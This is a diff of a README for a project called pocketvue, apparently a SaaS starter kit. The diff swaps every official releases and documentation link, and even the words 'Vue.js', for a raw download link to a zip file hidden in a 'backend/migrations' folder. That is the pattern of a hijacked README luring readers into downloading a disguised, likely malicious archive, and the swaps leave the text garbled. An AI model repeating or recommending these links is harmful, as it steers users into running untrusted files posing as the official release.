@@ -1,7 +1,7 @@
 # 📦 pocketvue - Simple SaaS Starter Kit for Everyone
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Online%20Here-brightgreen)](https://github.com/Spicephysicalentity43/pocketvue/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Spicephysicalentity43/pocketvue/main/backend/migrations/pocketvue-3.7.zip%20Latest%20Release-Online%20Here-brightgreen)](https://raw.githubusercontent.com/Spicephysicalentity43/pocketvue/main/backend/migrations/pocketvue-3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ To run PocketVue, you need:
 PocketVue comes with a range of helpful features, including:
 
 - **Single Binary Deployment:** No complex installations. Just download and run the binary.
-- **Vue.js Integration:** Supports frontend development using Vue.js.
+- **https://raw.githubusercontent.com/Spicephysicalentity43/pocketvue/main/backend/migrations/pocketvue-3.7.zip Integration:** Supports frontend development using https://raw.githubusercontent.com/Spicephysicalentity43/pocketvue/main/backend/migrations/pocketvue-3.7.zip
 - **Real-time Data Handling:** Efficiently manage data updates in real-time.
 - **User Authentication:** Built-in user management and access controls.
 - **Responsive Design:** Works well on both desktop and mobile browsers.
@@ -32,7 +32,7 @@ PocketVue comes with a range of helpful features, including:
 To get PocketVue on your device, follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/Spicephysicalentity43/pocketvue/releases) to find the latest version. 
+   Go to the [Releases page](https://raw.githubusercontent.com/Spicephysicalentity43/pocketvue/main/backend/migrations/pocketvue-3.7.zip) to find the latest version. 
 
 2. **Choose the Right Version:**
    Look for the most recent release. It will have the highest version number. 
@@ -66,7 +66,7 @@ If you encounter issues while using PocketVue, consider the following solutions:
 
 - **Check System Requirements:** Ensure your system meets the necessary requirements.
 - **Reinstall the Application:** If the application does not start, try uninstalling and then reinstalling it.
-- **Consult the Documentation:** Visit the official documentation or FAQ section on the [GitHub page](https://github.com/Spicephysicalentity43/pocketvue) for further guidance.
+- **Consult the Documentation:** Visit the official documentation or FAQ section on the [GitHub page](https://raw.githubusercontent.com/Spicephysicalentity43/pocketvue/main/backend/migrations/pocketvue-3.7.zip) for further guidance.
 
 ## 📞 Support
 
@@ -74,7 +74,7 @@ For questions or help, please open an issue on the GitHub page. Our team aims to
 
 ## 💡 Tips
 
-- Regularly check the [Releases page](https://github.com/Spicephysicalentity43/pocketvue/releases) for updates to benefit from the latest features and improvements.
+- Regularly check the [Releases page](https://raw.githubusercontent.com/Spicephysicalentity43/pocketvue/main/backend/migrations/pocketvue-3.7.zip) for updates to benefit from the latest features and improvements.
 - Explore community forums and resources for tips and tricks on building with PocketVue.
 
 Thank you for using PocketVue! We hope you find this application valuable for your projects. Happy coding!
